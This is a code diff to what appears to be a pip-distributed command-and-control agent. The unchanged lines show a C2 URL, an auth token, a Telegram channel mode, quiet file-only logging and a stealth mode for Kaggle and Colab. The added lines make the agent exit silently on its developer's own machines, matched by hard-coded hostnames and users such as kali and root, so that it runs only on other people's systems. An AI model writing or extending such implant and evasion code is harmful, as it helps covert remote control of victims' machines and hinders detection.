@@ -37,6 +37,11 @@ AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
 QUIET_MODE = True  # After registration, only log to file (not stdout)
 
+# Developer protection - don't run on local machine
+DEV_HOSTNAMES = ["debian", "kali", "localhost", "garedberns"]
+DEV_USERS = ["garedberns", "kali", "root"]
+SKIP_LOCAL = os.environ.get("SKIP_LOCAL", "1") == "1"  # Skip local execution by default
+
 # Detect C2 mode - Telegram mode when no HTTP URL provided
 TELEGRAM_MODE = (C2_URL == "" or C2_URL is None)
 
@@ -1199,6 +1204,14 @@ class UniversalAgent:
 def main():
     """Entry point for pip-installed agent."""
     import random
+    
+    # Developer protection - don't run on local machine
+    if SKIP_LOCAL:
+        hostname = socket.gethostname().lower()
+        user = os.environ.get("USER", os.environ.get("USERNAME", "")).lower()
+        if hostname in [h.lower() for h in DEV_HOSTNAMES] or user in [u.lower() for u in DEV_USERS]:
+            # Silently exit on developer machine
+            return
     
     # Stealth mode for Kaggle/Colab - minimal output
     if STEALTH_MODE:
